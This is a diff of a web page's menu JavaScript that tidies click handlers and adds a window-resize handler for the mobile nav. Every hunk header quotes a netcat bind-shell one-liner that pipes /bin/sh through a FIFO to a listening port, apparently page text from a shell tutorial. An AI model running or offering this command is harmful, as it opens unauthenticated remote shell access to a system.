@@ -150,7 +150,7 @@ cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo
     }
 
     var headerNav = document.getElementById('header-nav');
-    menu.addEventListener('click', function () {
+    menu.addEventListener('click', function() {
       if (headerNav.style.display === 'flex') {
         headerNav.style.display = 'none';
       } else {
@@ -158,7 +158,7 @@ cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo
       }
     });
 
-    document.addEventListener('click', function (evt) {
+    document.addEventListener('click', function(event) {
       if (!window.matchMedia('(max-width: 767px)').matches) {
         return;
       }
@@ -166,7 +166,7 @@ cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo
         return;
       }
 
-      let targetElement = evt.target;
+      let targetElement = event.target;
       do {
         if (targetElement == menu) {
           return;
@@ -175,7 +175,18 @@ cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo
       } while (targetElement)
 
       headerNav.style.display = 'none';
-    })
+    });
+
+    window.addEventListener('resize', function() {
+      if (window.matchMedia('(max-width: 767px)').matches) {
+        headerNav.style.display = 'none';
+        return;
+      }
+      if (headerNav.style.display === 'flex') {
+        return;
+      }
+      headerNav.style.display = 'flex';
+    });
   }
 
   window.addEventListener('load', setMenu);
